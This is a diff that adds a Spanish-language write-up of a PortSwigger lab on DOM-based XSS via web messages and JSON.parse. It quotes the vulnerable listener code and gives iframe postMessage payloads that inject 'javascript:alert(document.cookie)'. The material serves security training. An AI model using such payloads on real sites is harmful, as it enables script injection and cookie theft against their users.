@@ -445,7 +445,41 @@ Para resolver el laboratorio se carga en el exploit server un `iframe` que enví
 <iframe src="https://id-del-laboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')">
 ```
 
-### []()
+### [DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
+
+El sitio vulnerable tiene un event listener que espera recibir un string que es parseado con `JSON.parse()`. En el objeto parseado se espera que haya una propiedad `type` que es evaluada en un `switch`, y en caso de que tenga el valor `'load-channel'` se cambia el `src` del `iframe` al valor de la propiedad `url` del mismo objeto.
+
+```
+<script>
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+</script>
+```
+
+Para resolver el laboratorio se carga en el exploit server un `iframe`, donde el contenido del mensaje sea un string que pueda ser parseado, y que tenga 2 atributos: `type` (cuyo valor es `"load-channel"`) y `url` (cuyo valor es el código que se quiere inyectar).
+
+```
+<iframe src=https://id-del-laboratorio.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(document.cookie)\"}","*")'>
+```
 
 ---
 
